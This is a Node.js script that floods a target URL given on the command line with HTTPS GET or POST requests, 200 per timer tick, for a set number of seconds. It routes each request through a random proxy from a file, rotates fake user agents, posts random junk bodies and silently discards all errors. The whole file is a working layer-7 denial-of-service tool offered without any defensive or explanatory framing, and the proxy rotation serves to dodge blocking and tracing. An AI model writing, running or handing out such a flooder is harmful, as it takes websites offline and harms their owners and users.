var url = require('url');
var fs = require('fs');
var https = require('https');
var HttpsProxyAgent = require('https-proxy-agent');
var randua = require('fake-useragent');

var proxies = fs.readFileSync('proxy.txt', 'utf8').match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

var httpMethod = process.argv[4] ? process.argv[4].toUpperCase() : 'GET';

var options = {};
var parsed = url.parse(process.argv[2]);
const postdata = (l) => {
    const a = 'abcdefJDJDKDkkkKAsbKAKAKSKKS92929!#))#?$!@)#);$;$)#)/@)#!#!";;";*;ghijklmnopqstuvwxyz0123459292926789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}
const uas = randua();
parsed.method = httpMethod;
parsed.headers = {
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding': 'gzip, deflate, br',
  'accept-language': 'en-US;q=0.8,en;q=0.7',
  'cache-control': 'no-cache',
  'pragma': 'no-cache',
  'upgrade-insecure-requests': 1,
  'Connection': 'keep-alive',
  'user-agent': uas
}

if (httpMethod === 'POST') {
  parsed.headers['Content-Type'] = 'application/x-www-form-urlencoded';
}

setTimeout(function() {
  process.exit(1);
}, process.argv[3] * 1000);

setInterval(function() {
   for (var i = 0; i < 200; i++) {
      var requestOptions = { ...parsed, agent: new HttpsProxyAgent('http://' + proxies[Math.floor(Math.random() * proxies.length)]) };

      if (httpMethod === 'GET') {
        https.get(requestOptions, function(res) {
          console.log(res.statusCode);
        });
      } else if (httpMethod === 'POST') {
        var req = https.request(requestOptions, function(res) {
          console.log(res.statusCode);
        });
        req.write(postdata(6));
        req.end();
      }
    }
});